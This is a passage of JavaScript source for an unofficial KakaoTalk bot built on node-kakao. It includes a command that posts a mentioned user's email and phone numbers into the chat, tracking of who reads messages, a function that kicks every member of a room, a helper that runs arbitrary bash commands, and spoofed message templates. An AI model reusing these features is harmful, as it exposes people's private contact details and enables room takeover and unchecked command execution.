            chat.Channel.getUserInfoId(mentionList[0].UserId).isOpenUser()
          )}\n\n유저타입: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).UserType
          )}\n\n-----클라이언트 정보-----\n\nEmail: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).EmailAddress
          )}\n\nAccountDisplayId: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).AccountDisplayId
          )}\n\nTalkId: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).TalkId
          )}\n\nStatusMessage: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).StatusMessage
          )}\n\nNsn: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).NsnPhoneNumber
          )}\n\nPstn: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).PstnPhoneNumber
          )}\n\nFormatted Nsn: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId)
              .FormattedNsnPhoneNumber
          )}\n\nFormatted Pstn: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId)
              .FormattedPstnPhoneNumber
          )}\n\n`
        );
      }
      if (Text.startsWith(".방생성 ") && isAdmin(userId)) {
        var aq = Text.split(" ")[1].split("★♥♡%&")[0];
        var chlog = '"';
        client.ChannelManager.createOpenChannel({
          linkName: aq,
          description: "room : " + aq,
          canSearchLink: true,
          maxUserLimit: 1000,
          clientProfile: { type: 1 },
        }).then((x) => {
          if (x.result) {
            var LnkId = x.result.openLink.linkStruct.linkId;
            chat.replyText(
              "[ ! ] 방을 만들었습니다.\n링크id: " +
                x.result.openLink.linkStruct.linkId +
                "\n링크: " +
                x.result.openLink.linkStruct.linkURL
            );
          }
        });
      } //!방생성 (방이름)
    }
    if (Text == ".off" && isAdmin(userId)) {
      onon = false;
      chat.replyText("[ ! ] 봇이 꺼졌습니다");
    }
    if (Text == ".on" && isAdmin(userId)) {
      onon = true;
      chat.replyText("[ ! ] 봇이 켜졌습니다");
    }
    function pausecomp(millis) {
      var date = new Date();
      var curDate = null;
      do {
        curDate = new Date();
      } while (curDate - date < millis);
    }
  })
);
client.on("message_read", (channel, user, logId) => {
  let channelId = String(channel.Id);
  if (!(channelId in chatReaders)) chatReaders[channelId] = {};
  if (!(String(logId) in chatReaders[channelId]))
    chatReaders[channelId][String(logId)] = [];
  let userInfo = channel.getUserInfo(user);
  if (!userInfo) return;
  let userId = String(userInfo.Id);
  if (!chatReaders[channelId][String(logId)].includes(userInfo.Nickname)) {
    chatReaders[channelId][String(logId)].push(userInfo.Nickname);
  }
  let logIds = Object.keys(chatReaders[channelId]);
  if (logIds.length > 300) {
    delete chatReaders[channelId][logIds[0]];
  }
  //detecting users
  if (detectingUsers.includes(userId)) {
    channel.sendText(`[ ! ] ${userInfo.Nickname}님이 읽었습니다.`);
    detectingUsers.splice(detectingUsers.indexOf(userId), 1);
  }
});
function isAdmin(userId) {
  return adminList.includes(String(userId));
}
function delayKick(channel) {
  return __awaiter(this, void 0, void 0, function* () {
    let users = channel.getUserInfoList();
    for (let i of users) {
      client.OpenLinkManager.kickMember(channel, i.Id);
      yield new Promise((x) => setTimeout(x, 110));
    }
  });
}

client.on("message_read_2", (channel, reader, watermark) => {
  console.log(
    channel.getUserInfo(reader).Nickname +
      " 이(가) " +
      channel.Id +
      " 방의 글을 읽었습니다. 워터마크: " +
      watermark
  );
});
function blankFunc(chat) {}

function cho_hangul(str) {
  var cho = [
    "ㄱ",
    "ㄲ",
    "ㄴ",
    "ㄷ",
    "ㄸ",
    "ㄹ",
    "ㅁ",
    "ㅂ",
    "ㅃ",
    "ㅅ",
    "ㅆ",
    "ㅇ",
    "ㅈ",
    "ㅉ",
    "ㅊ",
    "ㅋ",
    "ㅌ",
    "ㅍ",
    "ㅎ",
  ];
  var result = "";
  for (var i = 0; i < str.length; i++) {
    var code = str.charCodeAt(i) - 44032;
    if (code > -1 && code < 11172) result += cho[Math.floor(code / 588)];
    else result += str.charAt(i);
  }
  return result;
}

function cmd(_cmd) {
  let cmdResult;
  try {
    cmdResult = cp.execSync(_cmd, { shell: "/bin/bash" }).toString();
  } catch (e) {
    cmdResult = e.toString();
  }
  return cmdResult.replace(/\u001b\[\d\dm/g, "");
}

Object.defineProperty(Object.prototype, "$", {
  get: function () {
    var self = this;
    return Object.getOwnPropertyNames(this)
      .map((v) => {
        try {
          return v + " : " + self[v];
        } catch (e) {}
        return v + " : error";
      })
      .join("\n");
  },
});

Object.defineProperty(Object.prototype, "$$", {
  get: function () {
    var self = this;
    return Object.getOwnPropertyNames(this.__proto__)
      .map((v) => {
        try {
          return v + " : " + self[v];
        } catch (e) {}
        return v + " : error";
      })
      .join("\n");
  },
});
var info = new node_kakao_1.CustomInfo(
  "미자지",
  "Carousel",
  "plusfriend_bot",
  "https://naver.com",
  "6.4.5",
  "6.4.5",
  "2.6.1",
  "2.3.5",
  undefined,
  undefined,
  undefined,
  undefined,
  false, // Link
  true, // BigChat
  false, // Sercure
  false, // KakaoVerifed (카카오 뱃지)
  true, // CanForward
  true, // Ref
  true // Ad
);
function CaroSel(chat, slide, userInfo, style) {
  if (!userInfo) {
    userInfo = {
      memberStruct: { nickname: "임지혁부계3", profileImageUrl: "" },
    };
  }
  style = style ? style : "";
  var content = new node_kakao_1.CustomCarouselContent(
    node_kakao_1.CustomType.FEED,
    slide.map((feed) => {
      feed.buttons = feed.buttons || [];
      feed.images = feed.images || [];
      var buttonTypes = { "up-down": 1, "left-right": 0 };
      if (feed.buttonType == "left-right")
        feed.buttons = feed.buttons.slice(0, 2);
      else if (feed.buttonType == "up-down")
        feed.buttons = feed.buttons.slice(0, 5);
      var cont = new node_kakao_1.CustomFeedContent(
        new node_kakao_1.TextDescFragment(feed.text, feed.desc),
        buttonTypes[feed.buttonType],
        feed.buttons.map((s) => {
          return new node_kakao_1.ButtonFragment(
            s.text,
            "both",
            new node_kakao_1.URLFragment(...new Array(4).fill(s.url))
          );
        }),
        feed.images.map((s) => {
          return new node_kakao_1.ImageFragment(
            s.image,
            s.width || -1,
            s.height || -1,
            s.cropStyle || 0,
            s.isLive || false
          );
        }),
        feed.images.length,
        undefined,
        true,
        undefined,
        new node_kakao_1.ProfileFragment(
          new node_kakao_1.TextDescFragment(
            style + userInfo.memberStruct.nickname,
            ""
          ),
          undefined,
          undefined,
          new node_kakao_1.ImageFragment(
            userInfo.memberStruct.profileImageUrl,
            200,
            200
          )
        ),
        new node_kakao_1.SocialFragment()
      );
      return cont;
    })
  );
  var attachment = new node_kakao_1.CustomAttachment(info, content);
  var template = new node_kakao_1.AttachmentTemplate(attachment, "카카오링크");
  return chat.replyTemplate(template);
}
